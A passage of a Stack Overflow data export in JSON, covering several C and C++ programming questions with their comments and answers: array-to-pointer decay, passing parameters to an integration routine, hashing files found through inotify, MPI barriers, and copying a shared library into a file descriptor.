"creation_date": 1551944044, "post_id": 55026846, "comment_id": 96827830, "body": "@Mike Arrays, when passed as argument to a function, get adjusted into a pointer to the first element of the array. So if you pass an array <code>char* []</code> to a function, the parameter will be of type <code>char**</code>, since that is a pointer to the first <code>char*</code> element in the <code>char* []</code> array. And it doesn&#39;t matter if you declare the function as <code>void f (char* foo[])</code> or <code>void f (char** foo)</code>, because the former will get silently translated into the latter."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 0, "last_activity_date": 1551886650, "creation_date": 1551886650, "answer_id": 55026846, "question_id": 55025820, "link": "https://stackoverflow.com/questions/55025820/why-cant-i-evaluate-array-to-null-in-a-for-loop/55026846#55026846", "title": "Why can&#39;t I evaluate &quot;array to NULL&quot; in a for loop?", "body": "<p>The main problem is that a 2D array has nothing to do with a <code>char**</code>. A pointer to pointer cannot point at a 2D array. It is not a 2D array. It is not compatible with a 2D array. Forget about pointer to pointers. </p>\n\n<p><em>Except</em> when you have a 1D array of pointers - then a pointer-to-pointer can be used to point at the first element of that array. So if your code in main() had been <code>char* argv[n] = { \"hello\", \"world\", ... }</code> then your function with <code>char**</code> would have worked.</p>\n\n<p>But it is not. You have a true 2D array in main(). So you have to change the function accordingly:</p>\n\n<pre><code>char* ft_concat_params (int x, int y, char argv[x][y])\n{\n  ...\n  argv[i][j]  // now you can use this way of accessing\n</code></pre>\n"}], "owner": {"reputation": 61, "user_id": 11041995, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-hTSjVGR9IHo/AAAAAAAAAAI/AAAAAAAAA7I/CjMzxCsjHSM/photo.jpg?sz=128", "display_name": "Mike", "link": "https://stackoverflow.com/users/11041995/mike"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 102, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1551886650, "creation_date": 1551883638, "last_edit_date": 1551884362, "question_id": 55025820, "link": "https://stackoverflow.com/questions/55025820/why-cant-i-evaluate-array-to-null-in-a-for-loop", "title": "Why can&#39;t I evaluate &quot;array to NULL&quot; in a for loop?", "body": "<p>I'm trying to count the elements of the array's arrays for the allocation of memory \"res,\" used to concatenate, including NULL terminators, every string stored in \"argv\". There are probably more bugs to be found, but the first I don't understand is <code>argv[a][b] != NULL</code> in <code>/* length of arrays */</code>. Why isn't this acceptable and are there other ways --without hardcoding- or passing length-- to determine number of elements?</p>\n\n<p>used: <a href=\"http://pythontutor.com/c.html#mode=edit\" rel=\"nofollow noreferrer\">http://pythontutor.com/c.html#mode=edit</a></p>\n\n<pre class=\"lang-c prettyprint-override\"><code>char    *ft_concat_params (int argc, char **argv)\n{\n    int len_argc = argc - 1,\n        len_argv = 0;\n    char *res = NULL;\n\n    /* length of argvs */\n    for (int a = 0; a &lt; len_argc; a++) {\n      for (int b = 0;argv[a][b] != NULL; b++) {\n        len_argv++;\n      }\n    }\n\n    /* allocate memory res -- freed by calling function! */\n    res = malloc (len_argv * sizeof * res);\n    if (!res) {\n      ft_putstr (\"not allocated res\");\n      free(res);\n      return NULL;\n    }\n\n    /* concate strings */\n    for (int a = 0; a &lt; len_argc; a++) {\n      int b = 0;\n      while (argv[a][b] != '\\0') {\n        res = &amp;argv[a][b];\n        b++;\n      }\n      res[b] = '\\0';\n    }\n\n    return res;\n}\n\nint   main(void)\n{\n  int argc = 4;\n  char argv[3][6] = {\n    {'s','t','a','r','t','\\0'},\n    {'s','t','a','r','t','\\0'},\n    {'s','t','a','r','t','\\0'}\n  };\n  char *arr;\n\n  arr = ft_concat_params (argc, argv);\n  if (!arr)       /* validate return */\n      return 1;\n\n  free(arr);\n}\n</code></pre>\n"}, {"tags": ["c", "parameter-passing", "numerical-integration"], "comments": [{"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 2, "creation_date": 1551883489, "post_id": 55025716, "comment_id": 96804331, "body": "Turn on your compiler warnings and <b>mind the warnings</b>."}, {"owner": {"reputation": 69, "user_id": 8602368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd77dc2afd2fab11870c85c076cca392?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel", "link": "https://stackoverflow.com/users/8602368/daniel"}, "reply_to_user": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1551883951, "post_id": 55025716, "comment_id": 96804648, "body": "Well, with -Wall I get no compiler warnings."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 2, "creation_date": 1551884447, "post_id": 55025716, "comment_id": 96804962, "body": "You have a random variable <code>x</code> in your code. Obviously compiler doesn&#39;t know what to do with it, but neither do we."}, {"owner": {"reputation": 69, "user_id": 8602368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd77dc2afd2fab11870c85c076cca392?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel", "link": "https://stackoverflow.com/users/8602368/daniel"}, "edited": false, "score": 0, "creation_date": 1551884686, "post_id": 55025716, "comment_id": 96805121, "body": "x is the integration variable of the function f. I see that the compiler cannot handle the x; this is why I got stuck; this is why I am asking the question. I hope the problem is clear for a human mind."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1551887643, "post_id": 55025716, "comment_id": 96807001, "body": "<a href=\"https://stackoverflow.com/questions/4393716/is-there-a-a-way-to-achieve-closures-in-c\" title=\"is there a a way to achieve closures in c\">stackoverflow.com/questions/4393716/&hellip;</a>"}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1551888279, "post_id": 55025716, "comment_id": 96807424, "body": "Well ... in <code>fctp1_t = f1d;</code> you&#39;re trying to assign <i>something</i> (I assumed this <i>something</i> is defined) to a type. I didn&#39;t test any compiler, but assumed any half decent one would complain."}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1551888431, "post_id": 55025716, "comment_id": 96807519, "body": "Can you <i>fork</i> <code>qtrap()</code> to something like <code>double qtrap2(double (*func)(double, int), double a, double b);</code>?"}], "answers": [{"tags": [], "owner": {"reputation": 48092, "user_id": 136208, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/8a30f566f1b7c9ae44cf245138850ba4?s=128&d=identicon&r=PG", "display_name": "AProgrammer", "link": "https://stackoverflow.com/users/136208/aprogrammer"}, "is_accepted": false, "score": 0, "last_activity_date": 1551885827, "creation_date": 1551885827, "answer_id": 55026551, "question_id": 55025716, "link": "https://stackoverflow.com/questions/55025716/reducing-the-number-of-arguments-in-functions-in-c/55026551#55026551", "title": "reducing the number of arguments in functions in C", "body": "<p>C does not allow to build a function like that.  You have two way to solve your problem:</p>\n\n<ul>\n<li><p>modify qtrap so that it is able to handle a parametrized function;</p></li>\n<li><p>use a global variable to pass the parameter implicitly.</p></li>\n</ul>\n"}], "owner": {"reputation": 69, "user_id": 8602368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd77dc2afd2fab11870c85c076cca392?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel", "link": "https://stackoverflow.com/users/8602368/daniel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 97, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1551885827, "creation_date": 1551883328, "question_id": 55025716, "link": "https://stackoverflow.com/questions/55025716/reducing-the-number-of-arguments-in-functions-in-c", "title": "reducing the number of arguments in functions in C", "body": "<p>I want to do a numerical integration of a function f using the qtrap function defined in \"Numerical recipes in C\".</p>\n\n<pre><code>double qtrap(double (*func)(double), double a, double b);\n</code></pre>\n\n<p>As shown, it is a 1-d integration of a variable of type double.</p>\n\n<p>But the function I want to integrate has an additional parameter a:</p>\n\n<pre><code>double f(double x, int a)\n{\n    return a + x * x;\n}\n</code></pre>\n\n<p>Now I am looking for a way to integrate f for different values of a.</p>\n\n<p>My idea up to now:</p>\n\n<pre><code>typedef double (*fctp1_t)(double);       //function pointer type for 1 arg\ntypedef double (*fctp2_t)(double, int);  //function pointer type for 2 args\n\nint a = 10;\nfctp1_t = f1d;\nf1d = reduceArgument(f, a);\n\nqtrap(f1d, 0, 1);\n</code></pre>\n\n<p>with the reduceArgument something like this:</p>\n\n<pre><code>fctp1_t reduceArgument(fctp2_t f2d, int ia)\n{\n    return f2d(x, ia);\n}    \n</code></pre>\n\n<p>This code results in the error: 'x' undeclared.</p>\n\n<p>Thanks for any suggestions.</p>\n"}, {"tags": ["c", "file", "loops", "fopen"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1551881619, "post_id": 55025069, "comment_id": 96803143, "body": "Aside: note that <code>fread (data, 1, 1024, filename)</code> should be <code>fread (data, 1, 1024, infile)</code> and there should have been a compiler warning."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1551881918, "post_id": 55025069, "comment_id": 96803315, "body": "<code>while (count &lt; no_of_events)</code> How about a<code>for()</code> loop?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551882127, "post_id": 55025069, "comment_id": 96803454, "body": "<i>Why</i> can&#39;t you open the file at <code>&#47;&#47;issue arises here when not commented</code>, if you define <code>char filename[] = &quot;&#47;home&#47;joe&#47;Documents&quot;;</code>? What is the issue that arises?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1551882668, "post_id": 55025069, "comment_id": 96803775, "body": "Do you really mean to have a <code>return</code> in your middle <code>while</code> loop?  That will return from the function, and since the function in question here is <code>main</code>, that will furthermore exit the program.  If indeed you do want to do that, then note, too, that the <code>fflush()</code> call immediately following the <code>return</code> statement will never be executed (though it&#39;s also unneeded under the circumstances)."}, {"owner": {"reputation": 111, "user_id": 10101999, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-pl3qk8GrXWE/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7qlnwZBhFZgnLt-IVbl-NOzKF6YtQ/mo/photo.jpg?sz=128", "display_name": "Joseph Smith", "link": "https://stackoverflow.com/users/10101999/joseph-smith"}, "edited": false, "score": 0, "creation_date": 1551885348, "post_id": 55025069, "comment_id": 96805569, "body": "John - I was in the process of integrating the hash function into the iteration - I must have missed that! Unfortunately &#39;fopen&#39; returns a segmentation fault now (after amending to the below answer) as it seems to think that the new file (its name defined by &#39;event-&gt;name&#39;) does not exist, when it clearly does! arhhh"}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 1, "last_activity_date": 1551882245, "creation_date": 1551882245, "answer_id": 55025360, "question_id": 55025069, "link": "https://stackoverflow.com/questions/55025069/how-to-open-file-within-while-loop-that-is-dependant-on-information-not-yet-decl/55025360#55025360", "title": "how to open file within while loop that is dependant on information not yet declared?", "body": "<p>The name of the file that you want to open is stored in <code>event-&gt;name</code>.  That's what you want to pass to <code>fopen</code>.  Also, you want to pass <code>infile</code> to both <code>fread</code> and <code>fclose</code>.</p>\n\n<pre><code>FILE *infile = fopen (event-&gt;name, \"rb\");                   // event-&gt;name is the filename\nSHA512_Init (&amp;mdContext);\nwhile ((bytes = fread (data, 1, 1024, infile )) != 0)       // read from infile\n    SHA512_Update (&amp;mdContext, data, bytes);\nSHA512_Final (c,&amp;mdContext);\nfor(i = 0; i &lt; SHA512_DIGEST_LENGTH; i++) printf(\"%02x\", c[i]);\nprintf (\" %s\\n\", event-&gt;name);\nfclose (infile);                                            // close infile\n</code></pre>\n"}], "owner": {"reputation": 111, "user_id": 10101999, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-pl3qk8GrXWE/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7qlnwZBhFZgnLt-IVbl-NOzKF6YtQ/mo/photo.jpg?sz=128", "display_name": "Joseph Smith", "link": "https://stackoverflow.com/users/10101999/joseph-smith"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "accepted_answer_id": 55025360, "answer_count": 1, "score": -1, "last_activity_date": 1551882245, "creation_date": 1551881389, "question_id": 55025069, "link": "https://stackoverflow.com/questions/55025069/how-to-open-file-within-while-loop-that-is-dependant-on-information-not-yet-decl", "title": "how to open file within while loop that is dependant on information not yet declared?", "body": "<p>I am attempting to open a file that will only be known once it has been created within a directory, however the FILE *infile (etc, etc..) function does not work in this scenario as \"infile\" has not previously been delcared. I can't work out how to declare this before the loop so that it gets the current file that is being iterated at that time.</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n    #include &lt;unistd.h&gt;\n    #include &lt;sys/types.h&gt;\n    #include &lt;sys/stat.h&gt;\n    #include &lt;fcntl.h&gt;\n    #include &lt;string.h&gt;\n    #include &lt;errno.h&gt;\n    #include &lt;sys/inotify.h&gt;\n    #include &lt;openssl/sha.h&gt;\n\n    int main (int argc, char *argv[])\n    {\n            int result;\n            int fd;\n            int wd;\n            unsigned char c[SHA512_DIGEST_LENGTH];\n            int i;\n            //FILE *inFile = fopen (filename, \"rb\"); //I'm aware this would usually\n                                                     //be declared here              \n            SHA512_CTX mdContext;\n            int bytes;\n            unsigned char data[1024];\n            const int event_size = sizeof(struct inotify_event);\n            const int buf_len = 1024 * (event_size + FILENAME_MAX);\n\n\n            fd = inotify_init();\n\n            if (fd &lt; 0) {\n              perror(\"inotify_init\");\n            }\n\n            wd = inotify_add_watch(fd, \"/home/joe/Documents\", IN_CREATE);\n\n            while (1) {\n              char buff[buf_len];\n              char target[FILENAME_MAX];\n              int no_of_events, count = 0;\n\n              no_of_events = read (fd, buff, buf_len);\n              while (count &lt; no_of_events) {\n                struct inotify_event *event = (struct inotify_event *)&amp;buff[count];\n                if (event-&gt;len) {\n                  if (event-&gt;mask &amp; IN_CREATE)\n                  if(!(event-&gt;mask &amp; IN_ISDIR)) {\n                    printf(\"The file %s has been created\\n\", event-&gt;name);\n\n                    //FILE *infile = fopen (filename, \"rb\");  //issue arises here \n                                                              //when not commented\n                    SHA512_Init (&amp;mdContext);\n                    while ((bytes = fread (data, 1, 1024, filename)) != 0)\n                        SHA512_Update (&amp;mdContext, data, bytes);\n                    SHA512_Final (c,&amp;mdContext);\n                    for(i = 0; i &lt; SHA512_DIGEST_LENGTH; i++) printf(\"%02x\", c[i]);\n                    printf (\" %s\\n\", event-&gt;name);\n                    fclose (filename);\n                    return 0;\n                    fflush(stdout);\n                  }\n                }\n                count += event_size + event-&gt;len;\n              }\n            }\n            return 0;\n    }\n</code></pre>\n\n<p>I'm trying to work out the issue hence the comments and also undeclared \"filename\".</p>\n"}, {"tags": ["c++", "c", "mpi"], "comments": [{"owner": {"reputation": 9396, "user_id": 2261538, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4e60dd44745bd1518ee933e081119de?s=128&d=identicon&r=PG", "display_name": "darune", "link": "https://stackoverflow.com/users/2261538/darune"}, "edited": false, "score": 2, "creation_date": 1551881459, "post_id": 55024792, "comment_id": 96803040, "body": "Welcome to stack overflow - please see &quot;How to ask questions&quot; <a href=\"https://stackoverflow.com/help/how-to-ask\">stackoverflow.com/help/how-to-ask</a>"}, {"owner": {"reputation": 5353, "user_id": 1128551, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1b2e64745ac36bf554b976e3625a4ba0?s=128&d=identicon&r=PG&f=1", "display_name": "Shibli", "link": "https://stackoverflow.com/users/1128551/shibli"}, "edited": false, "score": 0, "creation_date": 1551884187, "post_id": 55024792, "comment_id": 96804790, "body": "You should not put &#39;MPI_Barrier` inside if-block if not all processes can enter because that function needs to be called by all processes. Instead of multiple <code>MPI_Barrier</code> in each if-block, just put one where ever you want all processes to stop by and wait for others."}, {"owner": {"reputation": 1, "user_id": 11160113, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-evrXWw14vKY/AAAAAAAAAAI/AAAAAAAAAd4/a04WDsUaMY4/photo.jpg?sz=128", "display_name": "Evohunter", "link": "https://stackoverflow.com/users/11160113/evohunter"}, "edited": false, "score": 0, "creation_date": 1551889739, "post_id": 55024792, "comment_id": 96808312, "body": "So in my case where would be best to place MPI_Barrier to make them wait for each other ? I need to do the reading part and then the search part done by each of the remaining processes."}], "owner": {"reputation": 1, "user_id": 11160113, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-evrXWw14vKY/AAAAAAAAAAI/AAAAAAAAAd4/a04WDsUaMY4/photo.jpg?sz=128", "display_name": "Evohunter", "link": "https://stackoverflow.com/users/11160113/evohunter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 256, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1551905701, "creation_date": 1551880520, "last_edit_date": 1551905701, "question_id": 55024792, "link": "https://stackoverflow.com/questions/55024792/mpi-c-how-do-i-make-the-processes-wait-for-the-master", "title": "MPI C++ | How do I make the processes wait for the master?", "body": "<p>I have a program to make that should do the following: Read the size of an array, read each element of the array, and then a number that I want to find in that array. The program must split the search for each process. The problem I have is that I do not know how to make all the slave processes wait for the master to finish the reading process. Here is what I've got so far:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;conio.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;cstdlib&gt;\n#include \"mpi.h\"\n\nusing namespace std;\n\nvoid searchForElementInArray(int left, int right, int myArray[], int number);\nvoid readArrayAndNumber(int myArray[], int &amp;arraySize, int &amp;number);\n\nint main(int argc, char *argv[])\n{\n    int LIMIT = 100;\n    int numberOfProcesses;\n    int processRank;\n    int error;\n    int length;\n\n    int myArray[1010];\n    int arraySize;\n    int number;\n\n    error = MPI_Init(&amp;argc, &amp;argv);\n    if (error != MPI_SUCCESS) {\n        cout &lt;&lt; \"Error starting MPI program. Terminating.\\n\";\n        MPI_Abort(MPI_COMM_WORLD, error);\n    }\n\n    // get the number of processes\n    MPI_Comm_size(MPI_COMM_WORLD, &amp;numberOfProcesses);\n    MPI_Bcast(&amp;arraySize, 1, MPI_INT, 0, MPI_COMM_WORLD);\n\n    // Length of each interval\n    length = arraySize / numberOfProcesses;\n\n    //get the process rank\n    MPI_Comm_rank(MPI_COMM_WORLD, &amp;processRank);\n\n    if (!processRank) { // Master\n\n        readArrayAndNumber(myArray, arraySize, number);\n\n        MPI_Send(&amp;myArray, 1, MPI_INT, 1, 0, MPI_COMM_WORLD);\n        MPI_Send(&amp;arraySize, 1, MPI_INT, 1, 0, MPI_COMM_WORLD);\n        MPI_Send(&amp;number, 1, MPI_INT, 1, 0, MPI_COMM_WORLD);\n\n        MPI_Barrier(MPI_COMM_WORLD);\n\n    }\n    else { // Slave\n\n        if (processRank != numberOfProcesses - 1) {\n\n            MPI_Recv(&amp;myArray, 1, MPI_INT, 0, 0, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\n            MPI_Recv(&amp;arraySize, 1, MPI_INT, 0, 0, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\n            MPI_Recv(&amp;number, 1, MPI_INT, 0, 0, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\n\n\n            searchForElementInArray(length * processRank, length * processRank + length, myArray, 66);\n\n            MPI_Barrier(MPI_COMM_WORLD);\n\n        }\n        else {\n\n\n            MPI_Recv(&amp;myArray, 1, MPI_INT, 0, 0, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\n            MPI_Recv(&amp;arraySize, 1, MPI_INT, 0, 0, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\n            MPI_Recv(&amp;number, 1, MPI_INT, 0, 0, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\n\n\n            searchForElementInArray(length * processRank, arraySize, myArray, 66);\n\n            MPI_Barrier(MPI_COMM_WORLD);\n\n        }\n\n    }\n\n    MPI_Finalize();\n    _getch();\n    return 0;\n}\n\nvoid searchForElementInArray(int left, int right, int myArray[], int number) {\n\n    int flag = 0;\n\n    cout &lt;&lt; \"Searched positions: \";\n\n    for (int i = left; i &lt; right; i++) {\n\n        cout &lt;&lt; i &lt;&lt; \" \";\n        if (myArray[i] == number) {\n\n            cout &lt;&lt; endl &lt;&lt; \"Found on position \" &lt;&lt; i;\n            flag = 1;\n            break;\n\n        }\n\n\n    }\n\n    if (flag == 0) {\n\n        cout &lt;&lt; endl &lt;&lt; \"Not found\";\n\n    }\n\n    int processRank;\n    MPI_Comm_rank(MPI_COMM_WORLD, &amp;processRank);\n    cout &lt;&lt; \" by Process: \" &lt;&lt; processRank &lt;&lt; endl &lt;&lt; endl;\n\n}\n\nvoid readArrayAndNumber(int myArray[], int &amp;arraySize, int &amp;number) {\n\n    cin &gt;&gt; arraySize;\n    for (int i = 0; i &lt; arraySize; i++) {\n\n        cin &gt;&gt; myArray[i];\n\n    }\n    cin &gt;&gt; number;\n\n}\n</code></pre>\n"}, {"tags": ["c", "file", "shared-libraries"], "comments": [{"owner": {"reputation": 15776, "user_id": 12471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ce93e41c69b4e4ea8afce22cf11e2f4?s=128&d=identicon&r=PG", "display_name": "Jan Kr&#252;ger", "link": "https://stackoverflow.com/users/12471/jan-kr%c3%bcger"}, "edited": false, "score": 2, "creation_date": 1551879668, "post_id": 55024399, "comment_id": 96801942, "body": "1) you can use open() instead of fopen() to directly get an FD; 2) if fileno() &quot;isn&#39;t working properly&quot; it would help if you shared the code you tried with it and what the result was..."}, {"owner": {"user_type": "does_not_exist", "display_name": "user11050959"}, "reply_to_user": {"reputation": 15776, "user_id": 12471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ce93e41c69b4e4ea8afce22cf11e2f4?s=128&d=identicon&r=PG", "display_name": "Jan Kr&#252;ger", "link": "https://stackoverflow.com/users/12471/jan-kr%c3%bcger"}, "edited": false, "score": 0, "creation_date": 1551879932, "post_id": 55024399, "comment_id": 96802115, "body": "@JanKr&#252;ger I would like to copy the content of the variable fichier to the file descriptor shm_fd that I have created using open_ramfs()"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551880191, "post_id": 55024399, "comment_id": 96802266, "body": "Did you try to <code>fread</code> from the <code>FILE *</code> and <code>write</code> to the file descriptor?"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551880255, "post_id": 55024399, "comment_id": 96802313, "body": "@coco: so what code did you write that didn&#39;t work?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user11050959"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551880301, "post_id": 55024399, "comment_id": 96802341, "body": "@dbush I want to do the exact opposite ..."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551880357, "post_id": 55024399, "comment_id": 96802367, "body": "@coco I edited the comment right after I posted it.  Take another look."}, {"owner": {"reputation": 15776, "user_id": 12471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ce93e41c69b4e4ea8afce22cf11e2f4?s=128&d=identicon&r=PG", "display_name": "Jan Kr&#252;ger", "link": "https://stackoverflow.com/users/12471/jan-kr%c3%bcger"}, "edited": false, "score": 1, "creation_date": 1551880372, "post_id": 55024399, "comment_id": 96802374, "body": "@coco sure, and there are many ways to do that, some more efficient than others, but my impression was that you&#39;re having trouble with setting up the basics - if that&#39;s the case, a little more detail would help - like what code you&#39;ve tried that isn&#39;t working. After that, the easiest (and also least efficient) way would be to loop over a duo of <code>fread</code> and <code>write</code> calls..."}, {"owner": {"user_type": "does_not_exist", "display_name": "user11050959"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551880376, "post_id": 55024399, "comment_id": 96802377, "body": "@rici I erase the &quot;code&quot; I wrote in the takeFromDisk() function, my goal is to take the content of fichier and put it in the file descriptor shm_fd"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1551880463, "post_id": 55024399, "comment_id": 96802438, "body": "<i>I would like to copy the content of a FILE</i> file (a .so library) into a file descriptor that I&#39;ll give to an other function*  Seems like a classic <a href=\"https://meta.stackexchange.com/questions/66377/what-is-the-xy-problem\">XY problem</a>.  You have another problem (&quot;an other function&quot;) and you&#39;ve decided on your solution and are trying to force it.  What are you trying to do with this data?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user11050959"}, "reply_to_user": {"reputation": 15776, "user_id": 12471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ce93e41c69b4e4ea8afce22cf11e2f4?s=128&d=identicon&r=PG", "display_name": "Jan Kr&#252;ger", "link": "https://stackoverflow.com/users/12471/jan-kr%c3%bcger"}, "edited": false, "score": 0, "creation_date": 1551880478, "post_id": 55024399, "comment_id": 96802454, "body": "@JanKr&#252;ger I&#39;ve added the code I tried in my post ;)"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1551880599, "post_id": 55024399, "comment_id": 96802529, "body": "<code>write(shm_fd, (void *)c, sizeof(c));</code>  Ouch.  When your compiler complains about an incorrect type, blindly adding a cast doesn&#39;t really fix anything.  You&#39;re writing the first byte of the <i>address</i> of <code>c</code> to the file instead of the <i>contents</i> of <code>c</code>."}], "answers": [{"comments": [{"owner": {"reputation": 15776, "user_id": 12471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ce93e41c69b4e4ea8afce22cf11e2f4?s=128&d=identicon&r=PG", "display_name": "Jan Kr&#252;ger", "link": 